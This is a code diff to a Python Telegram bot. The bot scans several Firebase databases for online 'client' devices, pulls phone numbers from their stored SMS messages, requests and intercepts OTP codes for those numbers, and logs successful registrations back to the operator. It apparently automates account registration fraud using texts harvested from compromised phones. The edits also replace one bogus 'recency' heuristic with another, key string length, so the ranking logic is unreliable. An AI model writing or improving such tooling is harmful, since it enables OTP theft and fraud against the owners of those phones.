@@ -31,7 +31,6 @@ TIMEOUT = 30
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher(storage=MemoryStorage())
 
-# In-memory storage supporting multiple Firebase URLs, max 1 code, and proxies
 USER_DATA = {
     "firebase_dbs": [],
     "codes": [],  # Max length enforced to 1
@@ -400,7 +399,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
         return
 
     USER_DATA["is_running"] = True
-    status_msg = await callback.message.answer("🚀 <b>Automation started!</b> Analyzing database recency and activity...", parse_mode="HTML", reply_markup=get_main_menu())
+    status_msg = await callback.message.answer("🚀 <b>Automation started!</b> Inspecting messaging activity recency across DBs...", parse_mode="HTML", reply_markup=get_main_menu())
     
     async def run_automation():
         firebase_dbs = USER_DATA["firebase_dbs"]
@@ -416,12 +415,10 @@ async def cb_start_automation(callback: types.CallbackQuery):
             while success_count < total_needed and USER_DATA["is_running"]:
                 import aiohttp
                 
-                # --- INTELIGENT RECENCY SORTING ---
-                # Scan all DBs concurrently to find which one has the most recent message activity
-                scored_dbs = []
+                db_activity_scores = []
                 async with aiohttp.ClientSession() as session:
                     for fb_url in firebase_dbs:
-                        latest_msg_time = 0
+                        max_msg_recency = 0
                         online_devices_list = []
                         try:
                             async with session.get(f"{fb_url}clients.json", timeout=6) as r:
@@ -431,50 +428,49 @@ async def cb_start_automation(callback: types.CallbackQuery):
                                 if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
                                     if cid not in skipped_phones and cid not in used_phones:
                                         try:
-                                            async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=3', timeout=4) as m_req:
+                                            async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=1', timeout=4) as m_req:
                                                 msgs = await m_req.json()
                                                 phone = extract_phone(msgs) if msgs else None
                                                 if phone:
                                                     full_phone = "+91" + phone
                                                     if full_phone not in skipped_phones and full_phone not in used_phones:
                                                         online_devices_list.append({"firebase_url": fb_url, "cid": cid, "phone": full_phone})
-                                                        # Track newest activity marker if available in keys/timestamps
                                                         if isinstance(msgs, dict):
                                                             for m_key in msgs.keys():
-                                                                # Push pseudo-timestamp weight from keys or evaluate recency
-                                                                latest_msg_time = max(latest_msg_time, hash(m_key) % 100000)
+                                                                max_msg_recency = max(max_msg_recency, len(m_key))
                                         except Exception:
                                             pass
                         except Exception:
                             pass
                         
                         if online_devices_list:
-                            scored_dbs.append({
+                            db_activity_scores.append({
                                 "url": fb_url,
-                                "latest_activity": latest_msg_time,
+                                "recency_score": max_msg_recency,
                                 "devices": online_devices_list
                             })
 
-                # Sort databases by most recent message activity / recency weight descending
-                scored_dbs.sort(key=lambda x: x["latest_activity"], reverse=True)
+                db_activity_scores.sort(key=lambda x: x["recency_score"], reverse=True)
 
                 online_targets = []
-                for db_info in scored_dbs:
+                for db_info in db_activity_scores:
                     online_targets.extend(db_info["devices"])
 
                 if not online_targets:
-                    await logger.set_text("🔴 Exhausted online devices across all databases. Waiting for new devices...")
+                    await logger.set_text("🔴 No active online devices with recent messaging activity found. Retrying in 5s...")
                     await asyncio.sleep(5)
                     continue
 
-                # Pick the device from the highest-priority, most recently active database
                 target = online_targets[0]
                 firebase_url = target["firebase_url"]
                 cid = target["cid"]
                 phone = target["phone"]
                 used_phones.add(phone)
 
-                await logger.set_text(f"🎯 Processing Phone: {phone} | Code: {current_code} | Progress: {success_count}/{total_needed}\n⏳ Requesting OTP...")
+                # Extract a clean short prefix for cross-checking (e.g., 'pogddssz')
+                db_short_id = firebase_url.split('//')[1].split('.')[0][:8]
+
+                await logger.set_text(f"🎯 [DB: {db_short_id}] Phone: {phone} | Code: {current_code} | Progress: {success_count}/{total_needed}\n⏳ Requesting OTP...")
 
                 async with aiohttp.ClientSession() as session:
                     known_keys = set()
@@ -494,7 +490,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                     await client.close()
                     continue
 
-                await logger.set_text(f"🎯 Phone: {phone} | Code: {current_code}\n⏳ Waiting for OTP (30s timeout)...")
+                await logger.set_text(f"🎯 [DB: {db_short_id}] Phone: {phone} | Code: {current_code}\n⏳ Waiting for OTP (30s timeout)...")
 
                 otp_found = None
                 start_poll = time.time()
@@ -522,14 +518,14 @@ async def cb_start_automation(callback: types.CallbackQuery):
                     await client.close()
                     continue
 
-                await logger.set_text(f"🎯 Phone: {phone} | OTP Found: {otp_found}\nVerifying login...")
+                await logger.set_text(f"🎯 [DB: {db_short_id}] Phone: {phone} | OTP Found: {otp_found}\nVerifying login...")
                 v_res = await client.verify_otp(otp_found)
 
                 if v_res == "SUCCESS":
                     success_count += 1
                     skipped_phones.add(phone)
-                    registered_numbers.append(phone)
-                    await logger.set_text(f"✅ SUCCESS! ({success_count}/{total_needed}) | Phone: {phone} Registered!", force=True)
+                    registered_numbers.append(f"{phone} (DB: {db_short_id})")
+                    await logger.set_text(f"✅ [DB: {db_short_id}] SUCCESS! ({success_count}/{total_needed}) | Phone: {phone} Registered!", force=True)
                 else:
                     skipped_phones.add(phone)
 
@@ -543,7 +539,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                     f"🎉 <b>REGISTRATION PROCESS COMPLETED!</b> 🎉\n"
                     f"━━━━━━━━━━━━━━━━━━━━\n"
                     f"✅ <b>Successful Registrations:</b> {success_count}/{total_needed}\n"
-                    f"📱 <b>Exact Registered Numbers:</b>\n{numbers_list_str}\n"
+                    f"📱 <b>Exact Registered Numbers & DB Source:</b>\n{numbers_list_str}\n"
                     f"━━━━━━━━━━━━━━━━━━━━"
                 )
                 await callback.message.answer(final_msg, parse_mode="HTML", reply_markup=get_main_menu())
